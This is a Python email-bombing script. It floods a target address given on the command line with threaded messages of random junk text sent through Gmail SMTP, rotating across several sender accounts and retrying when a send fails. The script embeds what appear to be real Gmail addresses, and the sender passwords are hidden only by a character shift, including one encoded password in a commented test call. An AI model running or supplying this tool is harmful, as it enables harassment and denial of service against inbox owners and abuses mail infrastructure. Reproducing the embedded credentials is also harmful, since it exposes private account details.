import smtplib, socket, sys, os, time
from random import randrange
import threading as t

emails = {"sceet421@gmail.com":"NULLL",
          #"sceet422@gmail.com":"NULLL",
          #"evanalekseyev@gmail.com":"NULLL",
          "arandomperson4206969@gmail.com":"NULL"
          }
subject = ""
name = sys.argv[2]
target = sys.argv[1]
reps = int(sys.argv[3])
threads = 30

# generate empty list (for thread array)
def returnNone(lenlist):
	obj = []
	for i in range(lenlist):
		obj.append(None)
	return obj

# generate random amount of text of iter length
def random_text(iter):
	bdy = ''
	for i in range(iter):
		char = str(chr(randrange(33, 126)))
		if char != '.':
			bdy += char
		else: 
			bdy += 'k'
	return bdy

# sends email and executes all dependencies
# num is the amount of times it has had to execute
# TODO: base64 for encryption
count = 1
def main(from_name, sent_from, sent_from_pass_enc, to_email, subject="", num=1):
    global count
    # set headers and body
    email_text = "From: {}\n".format(from_name)
    email_text += "To: {}\n".format(to_email)
    email_text += "Subject: {}\n\n".format(subject)
    email_text = email_text + random_text(randrange(500, 1000))

    #print(email_text)

    # decrypt
    sent_from_pass_enc_ = [i for i in sent_from_pass_enc]
    for i in range(len(sent_from_pass_enc_)):
        sent_from_pass_enc_[i] = chr(ord(sent_from_pass_enc_[i])-1)
    sent_from_pass = "".join(sent_from_pass_enc_)

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.ehlo()
        server.starttls()
        server.login(sent_from, sent_from_pass)
        server.sendmail(sent_from, [to_email], email_text)
        server.close()
        print('Email ' + str(count) + ' on try ' + str(num))
        count += 1
    except Exception as e:
        # try sending again after short sleep
        if num < 20:
            time.sleep(0.05)
            main(from_name, sent_from, sent_from_pass_enc, to_email, subject, num+1)
        #if it has been trying for some time, print error
        else:
            print(e)
            emails.pop(list(emails.keys()).index(sent_from))
            main(name,
                 list(emails.keys())[randrange(len(list(emails.keys())))],
                 list(emails.values())[randrange(len(list(emails.values())))],
                 target)

if __name__ == "__main__":
    startTime = time.time()
    p = returnNone(threads)
    if reps <= threads:
        for i in range(reps):
            p[i] = t.Thread(target=main,
                            args=[name,
                                  list(emails.keys())[reps % len(list(emails.keys()))],
                                  list(emails.values())[reps % len(list(emails.values()))],
                                  target])
            p[i].start()
            reps -= 1
        for i in range(reps):
            p[i].join()

    else:
        # replace threads for num
        for i in range(threads):
            p[i] = t.Thread(target=main,
                            args=[name,
                                  list(emails.keys())[reps % len(list(emails.keys()))],
                                  list(emails.values())[reps % len(list(emails.values()))],
                                  target])
            p[i].start()
            reps -= 1
        while True:
            # replace threads for num
            for i in range(threads):
                if p[i].is_alive() == False and reps > 0:
                    p[i] = t.Thread(target=main,
                                    args=[name,
                                          list(emails.keys())[reps % len(list(emails.keys()))],
                                          list(emails.values())[reps % len(list(emails.values()))],
                                          target])
                    p[i].start()
                    reps -= 1
                elif reps == 0:
                    break
            if reps <= 0:
                # replace threads for num
                print("Waiting for all threads to finish", end="")
                for i in range(threads):
                    p[i].join()
                    print(".", end="")
                break

    print("\nfinished in " + str(time.time() - startTime) + " seconds. Good job Evan!")
    # main("PP", "sceet421@gmail.com", 'fwbodppm', "giantsmilodon@gmail.com")
